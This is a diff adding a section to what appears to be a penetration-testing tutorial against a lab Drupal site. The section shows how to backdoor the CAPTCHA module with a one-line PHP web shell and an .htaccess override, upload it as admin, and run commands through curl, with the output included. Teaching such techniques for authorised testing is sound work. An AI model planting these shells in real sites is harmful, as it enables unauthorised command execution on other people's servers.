@@ -28,4 +28,42 @@ $ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 Once downloaded go to `Administration` > `Reports` > `Available updates`.
 From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.
 
-## Uploading a Backdoored Module
+## Uploading a Backdoored Module 
+Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha).
+
+Download the archive and extract its contents.
+Create a PHP web shell with the contents:
+```php
+<?php
+system($_GET['cmd']);
+?>
+```
+Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
+```html
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+</IfModule>
+```
+The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
+```shell
+$ mv shell.php .htaccess captcha
+$ tar cvf captcha.tar.gz captcha/
+
+captcha/
+captcha/.travis.yml
+captcha/README.md
+captcha/captcha.api.php
+captcha/captcha.inc
+captcha/captcha.info.yml
+captcha/captcha.install
+
+<SNIP>
+```
+Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.
+Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
+```shell
+$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?cmd=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
